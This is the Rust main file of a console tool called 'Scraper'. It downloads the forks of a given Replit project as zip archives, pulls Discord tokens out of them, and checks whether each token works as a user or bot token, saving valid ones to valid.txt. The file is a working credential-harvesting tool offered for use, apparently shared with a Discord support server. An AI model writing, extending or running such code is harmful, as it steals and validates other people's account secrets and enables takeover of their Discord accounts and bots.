use reqwest::Client;
mod repl;
use repl::Replit;
use std::sync::Arc;
use futures::{stream::futures_unordered::FuturesUnordered, StreamExt};
use std::io::{self, stdout, Write};
use tokio::fs::OpenOptions;
use tokio::io::AsyncWriteExt;
use std::{
    fs::File,
    io::{prelude::*, BufReader},
    path::Path,
};

fn lines_from_file(filename: impl AsRef<Path>) -> Vec<String> {
    let file = File::open(filename).expect("no such file");
    let buf = BufReader::new(file);
    buf.lines()
        .map(|l| l.expect("Could not parse line"))
        .collect()
}


#[tokio::main()]
async fn main() {
    if cfg!(target_os = "windows") {
        std::process::Command::new("cmd").arg("/C").arg("color");
    }

    println!("

        \x1b[91;40m╔════════════════════════════╗\x1b[0m
        \x1b[91;40m║ █▀ █▀▀ █▀█ ▄▀█ █▀█ █▀▀ █▀█ ║\x1b[0m
        \x1b[91;40m║ ▄█ █▄▄ █▀▄ █▀█ █▀▀ ██▄ █▀▄ ║\x1b[0m
        \x1b[91;40m╚════════════════════════════╝\x1b[0m

         \x1b[91;40m╔══════════════════════════╗\x1b[0m
         \x1b[91;40m║       MADE BY SHELL      ║\x1b[0m
         \x1b[91;40m╚══════════════════════════╝\x1b[0m
    \x1b[0m");
    println!("\x1b[0;91mView https://github.com/Shell1010 for any future projects.
Join our Discord Server for Help & Support + Announcements regarding future projects
https://discord.gg/jD4C57AJg6\x1b[0m");

    loop {
        println!("\x1b[0;91m
        \x1b[91;40m╔════════════════════════════╗\x1b[0m
        \x1b[91;40m║ █▀ █▀▀ █▀█ ▄▀█ █▀█ █▀▀ █▀█ ║\x1b[0m
        \x1b[91;40m║ ▄█ █▄▄ █▀▄ █▀█ █▀▀ ██▄ █▀▄ ║\x1b[0m
        \x1b[91;40m╚════════════════════════════╝\x1b[0m

    \x1b[91;40m╔════════════════════════════════════╗\x1b[0m
    \x1b[91;40m║  A. Scrape forks from inputted URL ║\x1b[0m
    \x1b[91;40m║  B. Check the tokens in tokens.txt ║\x1b[0m
    \x1b[91;40m╚════════════════════════════════════╝\x1b[0m

        \x1b[0m");
        print!("\x1b[0;92mPlease enter an Option: [>]\x1b[0m ");
        stdout().flush().unwrap();
        let mut option = String::new();
        io::stdin()
        .read_line(&mut option)
        .expect("Failed to read line");

        if option.trim() == "A" {
            chunk_scrape_forks().await;
        } else if option.trim() == "B" {
            check_tokens().await;
        } else {
            println!("\x1b[0;91mInvalid Option\x1b[0m ");
        }
    }
}

async fn check_tokens() {
    let client = Arc::new(Client::new());
    let tokens = lines_from_file("./tokens.txt");

    let mut tokens = tokens.iter().peekable();
    let repl = Replit::new("ok");
    let mut chunk_count = 0;

    let mut file_writer = OpenOptions::new()
    .create(true)
    .append(true)
    .open("valid.txt")
    .await.unwrap();

    file_writer.write_all("Self:\n".as_bytes()).await.unwrap();
    let mut futs = FuturesUnordered::new();
    while let Some(token) = &tokens.next() {
        futs.push(repl.self_check_tokens(client.clone(), token.to_string().clone()));
        chunk_count += 1;
        if tokens.peek().is_none() || chunk_count >= 100 {
            while futs.next().await.is_some() {};
            chunk_count = 0;
        }
    }

    let tokens = lines_from_file("./tokens.txt");
    let mut tokens = tokens.iter().peekable();
    let mut file_writer = OpenOptions::new()
        .create(true)
        .append(true)
        .open("valid.txt")
        .await.unwrap();
    file_writer.write_all("Bot:\n".as_bytes()).await.unwrap();
    let mut futs = FuturesUnordered::new();


    while let Some(token) = tokens.next() {
        futs.push(repl.bot_check_tokens(client.clone(), token.clone()));
        chunk_count += 1;
        if tokens.peek().is_none() || chunk_count >= 100 {
            while futs.next().await.is_some() {};
            chunk_count = 0;
        }
    }

    println!("Finished");

}

async fn chunk_scrape_forks() {
    println!("\x1b[0;32mExample URL: /@templates/Discord-Bot-Starter\x1b[0m");
    print!("\x1b[0;32mPlease input the URL to the repl: [>]\x1b[0m ");
    stdout().flush().unwrap();
    let mut url = String::new();
    io::stdin()
    .read_line(&mut url)
    .expect("Failed to read line");

    let repl = Replit::new(url.trim());
    let id = repl.get_id().await;

    let (urls, _ids) = repl.get_forks(&id).await;

    print!("\x1b[0;32mAmount of forks to scrape: [>]\x1b[0m ");
    stdout().flush().unwrap();
    let mut amount = String::new();
    io::stdin()
    .read_line(&mut amount)
    .expect("Failed to read line");
    let amount = amount.trim().parse::<u32>().expect("Did not type an integer");
    let client = Arc::new(Client::new());
    let mut futs = FuturesUnordered::new();
    let mut count = 1;
    let mut zips = Vec::new();
    let mut urls = urls.iter().peekable();
    let mut chunk_count = 0;


    while let Some(url) = urls.next() {

        let rep = repl.clone();
        futs.push(rep.get_zip(client.clone(), url.clone(), count));
        count += 1;
        chunk_count += 1;
        if urls.peek().is_none() || chunk_count >= 50 || chunk_count >= amount {
            while let Some(val) = futs.next().await {
                if let Some(val) = val { zips.push(val)}
            }
            chunk_count = 0
        }
        if count > amount {
            break;
        }

    };



    println!("\x1b[0;32mFinished all downloads!\x1b[0m");
    let mut tokens: Vec<String> = Vec::new();
    for zip in zips {
        let mut token = repl.search_extract(zip).await;
        tokens.append(&mut token);
    }
    let mut tokens = tokens.iter().peekable();
    let mut tok = tokens.clone();
    // Check Selfbot tokens
    let mut chunk_count = 0;

    let mut file_writer = OpenOptions::new()
    .create(true)
    .append(true)
    .open("valid.txt")
    .await.unwrap();

    file_writer.write_all("Self:\n".as_bytes()).await.unwrap();
    let mut futs = FuturesUnordered::new();
    while let Some(token) = tokens.next() {
        futs.push(repl.self_check_tokens(client.clone(), token.clone()));
        chunk_count += 1;
        if tokens.peek().is_none() || chunk_count >= 100 {
            while futs.next().await.is_some() {};
            chunk_count = 0;
        }
    }

    chunk_count = 0;
    file_writer.write_all("Bot:\n".as_bytes()).await.unwrap();
    let mut futs = FuturesUnordered::new();
    while let Some(token) = tok.next() {
        futs.push(repl.bot_check_tokens(client.clone(), token.clone()));
        chunk_count += 1;
        if tok.peek().is_none() || chunk_count >= 100 {
            while futs.next().await.is_some() {};
            chunk_count = 0;
        }
    }
    println!("Finished")


}